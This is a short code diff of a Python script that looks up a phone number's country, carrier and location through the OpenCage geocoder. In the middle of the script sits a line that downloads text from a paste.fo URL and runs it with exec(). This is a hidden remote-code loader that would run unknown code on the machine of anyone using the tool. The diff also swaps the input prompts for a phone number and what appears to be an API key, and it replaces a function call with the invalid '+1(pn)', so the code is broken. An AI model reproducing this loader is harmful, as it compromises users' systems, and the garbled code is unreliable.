@@ -13,17 +13,17 @@ from requests import get
 if os.path.exists("mylocation.html"):
   os.remove("mylocation.html")
 try:
-  number = input("Enter Phone Number: ")
+  number = input("+19029861558: ")
   x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
   pn = phonenumbers.parse(number)
 
-  country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
+  country = pycountry.countries.get(alpha_2=+1(pn))
   location = country.name
   print(location)
 
   print(carrier.name_for_number(phonenumbers.parse(number), "en"))
 
-  key = input("Enter Your API KEY: ")
+  key = input(":149de24f890a45b3b50262a38fd61fa5 ")
   geocoder = OpenCageGeocode(key)
   query = str(location)
   results = geocoder.geocode(query)
